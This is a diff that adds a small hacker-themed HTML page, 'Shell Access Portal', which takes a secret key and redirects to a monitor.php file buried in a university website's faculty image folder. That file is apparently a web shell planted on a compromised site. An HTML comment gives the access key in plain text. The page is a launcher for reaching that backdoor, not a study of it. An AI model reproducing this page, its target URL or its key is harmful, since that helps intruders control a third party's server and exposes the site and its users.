@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<!--Secret key: x4i9z2k7m8n3p6q0r5t1v8w9y2 --> 
+    <title>Shell Access Portal</title>
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #0f0;
+            background: #111;
+        }
+        h1 { 
+            color: #0f0; 
+            text-shadow: 0 0 5px #0f0; 
+        }
+        input[type="password"] {
+            background: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 8px;
+            font-family: 'Courier New', monospace;
+            width: 200px;
+        }
+        input[type="submit"] {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 8px 15px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            margin-left: 10px;
+        }
+        input[type="submit"]:hover {
+            background: #0a0;
+        }
+        .error {
+            color: #f00;
+            margin-top: 10px;
+        }
+    </style>
+    <script>
+        function accessShell() {
+            const key = document.getElementById('secretKey').value;
+            const url = `https://ssl.du.ac.bd/fontView/assets/faculty_image/monitor.php?key=${encodeURIComponent(key)}`;
+            window.location.href = url;
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>SECURE ACCESS PORTAL</h1>
+        <input type="password" id="secretKey" placeholder="Enter Secret Key">
+        <input type="submit" value="ACCESS" onclick="accessShell()">
+    </div>
+</body>
+</html>
